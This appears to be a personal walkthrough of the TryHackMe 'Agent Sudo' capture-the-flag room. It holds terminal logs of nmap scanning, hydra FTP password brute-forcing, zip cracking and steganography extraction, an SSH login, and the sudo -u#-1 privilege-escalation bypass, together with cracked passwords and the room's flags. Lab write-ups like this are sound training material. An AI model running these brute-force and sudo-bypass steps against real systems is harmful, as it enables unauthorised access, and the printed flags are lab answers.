Agent Sudo 

scan:

└─$ nmap -sV -F 10.49.146.228
Starting Nmap 7.98 ( [https://nmap.org](https://nmap.org/) ) at 2026-02-17 22:18 +0530
Nmap scan report for 10.49.146.228
Host is up (0.054s latency).
Not shown: 97 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,

Agent R

found the user name by using extension user agent switcher filter C

hydra -l chris -P /usr/share/wordlists/rockyou.txt   [ftp://10.49.146.228](ftp://10.49.146.228/) 

[21][ftp] host: 10.49.146.228   login: chris   password: crystal

ftp> ls -la
229 Entering Extended Passive Mode (|||22566|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Oct 29  2019 .
drwxr-xr-x    2 0        0            4096 Oct 29  2019 ..
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> mget *
mget To_agentJ.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||52008|)
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
100% |***|   217        1.91 MiB/s    00:00 ETA
226 Transfer complete.
217 bytes received in 00:00 (2.77 KiB/s)
mget cute-alien.jpg [anpqy?]? y
229 Entering Extended Passive Mode (|||60204|)
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
100% |***| 33143      631.83 KiB/s    00:00 ETA
226 Transfer complete.
33143 bytes received in 00:00 (325.30 KiB/s)
mget cutie.png [anpqy?]? y
229 Entering Extended Passive Mode (|||23158|)
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
100% |***********************************************************************************************************************************************************************************************| 34842      631.44 KiB/s    00:00 ETA
226 Transfer complete.
34842 bytes received in 00:00 (328.24 KiB/s)

──(kali㉿kali)-[~/TryHackMe/AgentSudo]
└─$ ls

AgentSudolab.txt  cute-alien.jpg  cutie.png    To_agentJ.txt

┌──(kali㉿kali)-[~/TryHackMe/AgentSudo]
└─$ binwalk -e cutie.png

┌──(kali㉿kali)-[~/TryHackMe/AgentSudo]
└─$ ls

AgentSudolab.txt  cute-alien.jpg  cutie.png  _cutie.png.extracted  To_agentJ.txt

┌──(kali㉿kali)-[~/TryHackMe/AgentSudo]
└─$ cd _cutie.png.extracted

┌──(kali㉿kali)-[~/TryHackMe/AgentSudo/_cutie.png.extracted]
└─$ ls
365  365.zlib  8702.zip

┌──(kali㉿kali)-[~/TryHackMe/AgentSudo/_cutie.png.extracted]
└─$ zip2john 8702.zip > hash.txt

┌──(kali㉿kali)-[~/TryHackMe/AgentSudo/_cutie.png.extracted]
└─$ john hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 20 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
alien            (8702.zip/To_agentR.txt)

1g 0:00:00:00 DONE 2/3 (2026-02-17 23:15) 1.666g/s 130286p/s 130286c/s 130286C/s 123456..bailey9
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

┌──(kali㉿kali)-[~/TryHackMe/AgentSudo/_cutie.png.extracted]
└─$ 7z e 8702.zip

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
64-bit locale=en_IN Threads:20 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

## Extracting archive: 8702.zip

Path = 8702.zip
Type = zip
Physical Size = 280

Enter password (will not be echoed):
Everything is Ok

Size:       86
Compressed: 280

┌──(kali㉿kali)-[~/TryHackMe/AgentSudo/_cutie.png.extracted]
└─$ ls
365  365.zlib  8702.zip  hashfile.txt  To_agentR.txt

┌──(kali㉿kali)-[~/TryHackMe/AgentSudo/_cutie.png.extracted]
└─$ cat To_agentR.txt
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R

┌──(kali㉿kali)-[~/TryHackMe/AgentSudo/_cutie.png.extracted]
└─$ echo "QXJlYTUx" | base64 -d
Area51

┌──(kali㉿kali)-[~/TryHackMe/AgentSudo/_cutie.png.extracted]
└─$ cd ..

┌──(kali㉿kali)-[~/TryHackMe/AgentSudo]
└─$ ls
AgentSudolab.txt  cute-alien.jpg  cutie.png  _cutie.png.extracted  To_agentJ.txt

┌──(kali㉿kali)-[~/TryHackMe/AgentSudo]
└─$ steghide extract -sf  cute-alien.jpg

Enter passphrase:
wrote extracted data to "message.txt".

┌──(kali㉿kali)-[~/TryHackMe/AgentSudo]
└─$ cat message.txt

Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris

$ ssh [james@10.49.161.94](mailto:james@10.49.161.94)    

james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt
b03d975e8c92a7c04146cfa7a5a313c7
james@agent-sudo:~$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.205.29 - - [18/Feb/2026 07:08:44] "GET / HTTP/1.1" 200 -

http://10.49.161.94:8000/Alien_autospy.jpg

now copy and the image and google lens to search the image 

the article found is Roswell alien autopsy

james@agent-sudo:~$ sudo -l
[sudo] password for james:
Matching Defaults entries for james on agent-sudo:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
(ALL, !root) /bin/bash - google search 
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# whoami
root
root@agent-sudo:~# cd /root
root@agent-sudo:/root# ls
root.txt
root@agent-sudo:/root# cat root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.

Your flag is
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
